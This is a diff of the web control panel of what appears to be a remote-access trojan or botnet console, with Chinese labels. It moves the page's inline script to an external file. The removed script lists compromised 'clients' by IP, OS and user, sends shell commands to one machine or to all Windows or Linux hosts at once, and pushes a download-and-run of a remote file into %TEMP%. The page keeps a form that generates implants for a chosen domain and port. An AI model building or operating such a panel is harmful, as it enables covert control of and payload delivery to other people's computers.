@@ -41,222 +41,8 @@
             overflow: auto;
         }
     </style>
+    <script src="/static/js/myjs.js"></script>
 
-    <script>
-        var u  = prompt("username：", "admin");
-        var p = prompt("password：", "123456");
-        var base = new Base64();
-        var loc = window.location;
-        var uri = 'ws:';
-        var nowhandle = '';
-        var nowip = '';
-        if (loc.protocol === 'https:') {
-            uri = 'wss:';
-        }
-        uri += '//127.0.0.1:3287';
-
-
-        ws = new WebSocket(uri);
-        ws.onopen = function () {
-            ws.send(JSON.stringify({"username":u,"password":p}));
-
-
-        };
-            ws.onmessage = function (evt) {
-                console.log(evt.data);
-                let data = JSON.parse(evt.data)
-                if(data["login"]===true){
-                    $("#log").append("<p style='color:blue'>后端连接成功</p>")
-
-                    for(let i=0;i<data["data"]["data"].length;i++){
-                        let z = data["data"]["data"][i]
-                        console.log(z)
-                        $("#server_list").append(
-                        `<tr id="`+data["data"]["uuid"]+`">
-                            <td><label>
-                            <input type="checkbox" name="category" value="`+z["uuid"]+`"/>
-                            </label></td>
-                            <td>`+z["info"]["ip"]+`</td>
-                            <td>`+z["info"]["remarks"]+`</td>
-                            <td>`+z["info"]["system"]+`</td>
-                            <td>`+z["info"]["user"]+`</td>
-                            <td>`+z["info"]["iip"]+`</td>
-                            <td><a href="javascript:new_cmd('`+z["info"]["ip"]+`','`+data["data"]["uuid"]+`');">终端</a> <a href="javascript:download('`+z["info"]["ip"]+`','`+data["data"]["uuid"]+`');" >下载</a> <a href="#">卸载</a></td>
-                            `
-                        );
-                    $("#log").append("<p style='color:green'>客户上线："+ip+"</p>")
-                    }
-                }
-                if(data["action"]==="online"){
-                    let i = data["data"]["info"]
-                    $("#server_list").append(
-                        `<tr id="`+data["data"]["uuid"]+`">
-                            <td><label>
-                            <input type="checkbox" name="category" value="`+data["data"]["uuid"]+`"/>
-                            </label></td>
-                            <td>`+i["ip"]+`</td>
-                            <td>`+i["remarks"]+`</td>
-                            <td>`+i["system"]+`</td>
-                            <td>`+i["user"]+`</td>
-                            <td>`+i["iip"]+`</td>
-                            <td><a href="javascript:new_cmd('`+i["ip"]+`','`+data["data"]["uuid"]+`');">终端</a> <a href="javascript:download('`+i["ip"]+`','`+data["data"]["uuid"]+`');" >下载</a> <a href="#">卸载</a></td>
-                            `
-                        );
-                    $("#log").append("<p style='color:green'>客户上线："+i["ip"]+"</p>")
-                }
-                if(data["action"] === "offline"){
-                    $(`#`+data["data"]["uuid"]).remove();
-                    $("#log").append("<p style='color:red'>客户下线："+data["data"]["info"]["ip"]+"</p>")
-                }
-                if(data["action"] === "result"){
-                    if (data["data"]["action"] === "cmd"){
-                        $(`#cmd_textarea`).val($(`#cmd_textarea`).val()+"From "+data["data"]["uuid"]+":\n\t"+data["data"]["data"]+"\n");
-                        $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
-                    }
-
-                }
-                // let flag = msg[0];
-                // let uuid = msg[1];
-                // let iip = msg[2];
-                // let ip = msg[3];
-                // let memory = msg[4];
-                // let os = msg[5];
-                // let name = msg[6]
-                // if (flag === "add") {
-                //     $("#server_list").append(
-                //         `<tr id="`+uuid+`">
-                //             <td><label>
-                //             <input type="checkbox" name="category" value="`+uuid+`"/>
-                //             </label></td>
-                //             <td>`+iip+`</td>
-                //             <td>`+name+`</td>
-                //             <td>`+os+`</td>
-                //             <td>`+memory+`</td>
-                //             <td>`+ip+`</td>
-                //             <td><a href="javascript:new_cmd('${iip}','${uuid}');">终端</a> <a href="javascript:download('${iip}','${uuid}');" >下载</a> <a href="#">卸载</a></td>
-                //             `
-                //     );
-                //     $("#log").append("<p style='color:green'>客户上线："+iip+"</p>")
-                // }else if (flag === "remove"){
-                //     $(`#`+uuid).remove();
-                //     $("#log").append("<p style='color:red'>客户下线："+iip+"</p>")
-                // }else if (flag === "log"){
-                //
-                // }else if (flag === "config"){
-                //     $("#log").append("<p style='color:blue'>Web控制台端口"+msg[1]+" 服务监听端口"+msg[2]+"</p>")
-                // }else if (flag === "out"){
-                //     let cmd = msg[2];
-                //     console.log(base.decode(cmd))
-                //     $(`#cmd_textarea`).val($(`#cmd_textarea`).val()+base.decode(cmd));
-                //     $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
-                //
-                // }
-
-
-        };
-        ws.onclose = function () {
-            $("#log").append("<p style='color:red'>后端连接失败</p>")
-            $("#light").css("display","none");
-            $("#fade").css("display","none");
-        };
-        function cmd_execute(){
-
-                let d = $("#cmd_input").val()
-                let p = $("#cmd_param").val()
-                let b64 = btoa(JSON.stringify({
-                    "command":d,
-                    "param":p
-                }))
-                //ws.send("shell|"+nowhandle+"|"+base.encode($("#cmd_input").val()));
-                ws.send(JSON.stringify(
-                    {
-                        "uuid": nowhandle,
-                        "do":{
-                            "do":"cmd",
-                            "data":b64
-                        }
-                    }
-                ))
-                $(`#cmd_textarea`).val($(`#cmd_textarea`).val()+"Send For: "+nowhandle+":\n\t"+d+" "+ p +"\n");
-                $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
-                $("#cmd_input").val("")
-                $("#cmd_param").val("")
-
-        }
-
-        function generate(){
-            $("#generate").css("display","block");
-            $("#fade").css("display","block");
-        }
-        function generate_close(){
-            // document.getElementById('light').style.display='none';
-            // document.getElementById('fade').style.display='none';
-            $("#generate").css("display","none");
-            $("#fade").css("display","none");
-
-        }
-        function download_close(){
-            // document.getElementById('light').style.display='none';
-            // document.getElementById('fade').style.display='none';
-            $("#download").css("display","none");
-            $("#fade").css("display","none");
-
-        }
-        function download(ip,id) {
-             $("#download").css("display","block");
-            $("#fade").css("display","block");
-            if (nowhandle != id){
-                $("#cmd_textarea").val("")
-            }
-            nowhandle=id;
-
-            nowip=ip;
-        }
-        function cmd_close(){
-            // document.getElementById('light').style.display='none';
-            // document.getElementById('fade').style.display='none';
-            $("#light").css("display","none");
-            $("#fade").css("display","none");
-
-        }
-        function new_cmd(ip,id) {
-            // document.getElementById('light').style.display='block';
-            // document.getElementById('fade').style.display='block';
-            $("#light").css("display","block");
-            $("#fade").css("display","block");
-            nowhandle=id;
-            nowip=ip;
-
-            $("#IP").html("目前控制的是："+ip);
-
-        }
-
-
-        function down_btu_on(){
-            if($("#http_address").val()==""){
-                $("#error_http_address").html("网址不能为空");
-                return;
-            }
-            if ($("#save_path").val()==""){
-                $("#error_save_path").html("将写入默认目录");
-                $("#save_path").val("%TEMP%")
-            }
-            ws.send("download|"+nowhandle+"|"+encodeURI($("#http_address").val())+"|"+$("#save_path").val()+"|"+$("#is_run").val());
-            $("#d_res").html("发送成功");
-        }
-
-        function generate_btu_on(){
-            if($("#domain").val()==""){
-                $("#error_domain").html("域名不能为空");
-                return;
-            }
-            if ($("#port").val()==""){
-                $("#error_port").html("端口不能为空");
-                return;
-            }
-            window.open("/generate?domain="+$("#domain").val()+"&port="+$("#port").val()+"&version="+$("#version").val(), "_blank");
-        }
-    </script>
 
 </head>
 <div>
@@ -302,20 +88,21 @@
                 <td>Remarks</td>
                 <td>OS</td>
                 <td>User</td>
+                <td>Status</td>
                 <td>Intranet IP</td>
                 <td>Action</td>
             </tr>
-            <tr id="s1">
-                <td><label>
-                        <input type="checkbox" name="category" value="s1"/>
-                    </label></td>
-                <td>1.1.1.1</td>
-                <td>测试机器1</td>
-                <td>Windows 10</td>
-                <td>administrator</td>
-                <td>192.168.0.7</td>
-                <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">卸载</a></td>
-            </tr>
+<!--            <tr id="s1">-->
+<!--                <td><label>-->
+<!--                        <input type="checkbox" name="category" value="s1"/>-->
+<!--                    </label></td>-->
+<!--                <td>1.1.1.1</td>-->
+<!--                <td>测试机器1</td>-->
+<!--                <td>Windows 10</td>-->
+<!--                <td>administrator</td>-->
+<!--                <td>192.168.0.7</td>-->
+<!--                <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">卸载</a></td>-->
+<!--            </tr>-->
         </table>
     </div>
     <div id="div_log" width="80%" style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
@@ -350,14 +137,12 @@
 
 <div id="download" class="white_content">Web Download
     <a href = "javascript:void(0)" onclick = "download_close();">关闭</a>
-    <p>注意路径转义，也就是d:\要写成d:\\才醒否则程序炸了后果自负</p>
     <br>
     远程地址：<input id="http_address" type="text"> <p id="error_http_address" style="color:red"></p>
     <br>
     保存路径：<input id="save_path" type="text"><p id="error_save_path" style="color:red"></p>
     <br>
     是否运行：<select id="is_run">
-
     <option  value="yes">是</option>
     <option value="no">否</option>
     </select>
@@ -373,9 +158,9 @@
                     <input id="batch_cmd_param" type="text" class="form-control" style="width: 95%">
                     <button aligh="right" onclick="cmd_execute()">execute</button>
     os:<select id="os">
-        <option  value="windows">all windows</option>
-        <option value="linux">all linux</option>
-        <option value="select">select</option>
+        <option  value="windows">所有windows机器</option>
+        <option value="linux">所有linux机器</option>
+        <option value="select">当前选择的机器</option>
     </select>
     <br>
     <button id="execute_cmd" aligh="right" onclick="down_btu_on()">运行</button>
